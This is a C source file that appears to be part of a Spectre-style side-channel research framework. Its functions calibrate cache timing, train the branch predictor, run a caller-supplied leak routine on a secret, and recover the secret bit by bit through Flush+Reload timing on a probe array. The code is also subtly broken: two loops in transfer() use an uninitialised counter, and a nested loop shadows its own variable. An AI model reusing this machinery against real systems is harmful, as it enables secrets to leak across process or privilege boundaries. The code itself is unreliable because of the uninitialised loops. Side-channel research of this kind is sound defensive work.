#include "../include/transfer.h"

uint32_t get_average()
{
    uint8_t addresses[NUMBER_OF_THRESHOLD_MEASUREMENTS*STRIDE];

    uint32_t measurements[NUMBER_OF_THRESHOLD_MEASUREMENTS];

    for (uint32_t i = 0; i < NUMBER_OF_THRESHOLD_MEASUREMENTS; i++)
    {
        clflush(addresses + (i * STRIDE));
        measurements[i] = access_time(addresses + (i * STRIDE));
    }

    uint32_t sum = 0;
    for (uint32_t i = 0; i < NUMBER_OF_THRESHOLD_MEASUREMENTS; i++)
    {
        sum += measurements[i];
        //printf("Flushed: %i\n", measurements[i]);
    }

    return sum / NUMBER_OF_THRESHOLD_MEASUREMENTS;
}
uint32_t get_average_cached()
{
    uint8_t addresses[NUMBER_OF_THRESHOLD_MEASUREMENTS*STRIDE];

    uint32_t measurements[NUMBER_OF_THRESHOLD_MEASUREMENTS];

    // Warming up Cache
    for (uint32_t i = 0; i < 16; i++)
    {
        for (uint32_t i = 0; i < NUMBER_OF_THRESHOLD_MEASUREMENTS; i++)
        {
            addresses[i*STRIDE] *= addresses[i*STRIDE];
        }
    }

    for (uint32_t i = 0; i < NUMBER_OF_THRESHOLD_MEASUREMENTS; i++)
    {
        addresses[i*STRIDE] *= addresses[i*STRIDE];
        measurements[i] = access_time(&addresses[i*STRIDE]);
    }

    uint32_t sum = 0;
    for (uint32_t i = 0; i < NUMBER_OF_THRESHOLD_MEASUREMENTS; i++)
    {
        sum += measurements[i];
        //printf("Cached: %i\n", measurements[i]);
    }

    return sum / NUMBER_OF_THRESHOLD_MEASUREMENTS;
}

bool is_cached(uint8_t *address, size_t threshold)
{
    size_t time = access_time(address);
    //lfence();
    //mfence();
    //printf("Address %zx cycles: %zu\n", address, time);
    if (time < threshold)
        return true;
    return false;
}

uint64_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, uint32_t train_data_len,
                        uint64_t secret, uint8_t channel[],
                        uint8_t bits_count, uint64_t stride),
         uint64_t in, size_t threshold, uint8_t bits_count, uint64_t stride, uint64_t train_data_length)
{
    // creating transfer array
    uint8_t side_channel[((bits_count + 1) * stride) + 4096];
    uint32_t out_index = 0;
    bool training;

    uint32_t train_data[train_data_length * stride];
    for (uint32_t i; i < train_data_length * stride; i++)
    {
        train_data[i] = i+1;
    }

    // empty the output
    uint64_t out = 0;

    memset(side_channel,5, ((bits_count + 1) * stride) + 4096);

    for (uint32_t i; i < train_data_length * stride; i++)
        clflush(&train_data[i]);

    // flushing the transfer array, before encoding data into it
    for (uint32_t i = 0; i < ((bits_count + 1) * stride) + 4096; i++)
        clflush(&side_channel[i]);

    maccess(&in);

    lfence();
    mfence();

    // training the predictor
    if (train_data_length > 0)
    {
        for (uint32_t i = 0; i < (train_data_length * stride) - 1; i += stride)
        {
            // using 0 as secret, so no adresses are loaded into cache
            training = leak_data(i, train_data, train_data_length * stride, 0, side_channel+4096, bits_count, stride);
            //printf("Training: %d\n", training);
        }
    }

    // writing secret into the side channel array
    training = leak_data((train_data_length * stride), train_data, train_data_length * stride, in, side_channel+4096, bits_count, stride);
    printf("Training: %d\n", training);

    char binaryResult[bits_count + 1];
    memset(binaryResult, 0, bits_count + 1);
    // reading data from the side channel array
    for (uint32_t i = 1; i < bits_count + 1; i++)
    {
        if (is_cached((side_channel + 4096) + (i * stride), threshold)){
            out += DOUBLE_TIMES(1, (i-1) % 8);
            binaryResult[i-1] = '1';
        }
        else {
            binaryResult[i-1] = '0';
        }
    }
    //printf("%s\n", binaryResult);

    return out;
}